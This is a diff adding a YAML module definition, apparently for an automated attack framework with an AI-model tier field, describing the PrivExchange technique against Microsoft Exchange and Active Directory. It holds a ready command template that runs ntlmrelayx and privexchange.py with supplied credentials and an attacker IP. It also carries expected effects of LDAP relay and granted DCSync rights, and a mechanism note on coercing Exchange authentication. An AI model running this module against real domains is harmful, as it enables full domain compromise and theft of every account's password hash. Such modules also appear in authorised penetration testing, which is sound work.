@@ -1,0 +1,38 @@
+name: privexchange
+category: ad
+description: PrivExchange — Exchange PushSubscription coerces EWS auth for LDAP relay
+preconditions:
+- has_cred
+- service.port==443
+- exchange_version_vulnerable
+parameters:
+  exchange_url: from_engagement.exchange_url
+  attacker_ip: from_engagement.attacker_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+command_template: ntlmrelayx.py -t ldap://{dc_ip} --escalate-user {username} & python3
+  privexchange.py -ah {attacker_ip} -u {username} -p '{password}' -d {domain} {exchange_url}
+parser: generic_parser
+expected_effects:
+- exchange_machine_coerced
+- ldap_relay_success
+- dcsync_right_granted
+- has_cred
+falsifier:
+  pattern: 401|403|patched|EPA|PushSubscription unavailable
+  timeout: 300
+model_tier: sonnet
+mechanism: 'Pre-CU-patch Exchange Server had WriteDACL on domain root by default (Exchange
+
+  Trusted Subsystem). Its EWS PushSubscription feature authenticates outbound to
+
+  any URL the subscriber names. Trick it into authenticating to ntlmrelayx,
+
+  relay to LDAP → add DCSync rights to the operator.
+
+  '
+references:
+  ocd_mindmap: 'Branch 1: PrivExchange (Exchange → LDAP relay)'
+  hacktricks: windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.md
+hacktricks_ref: windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
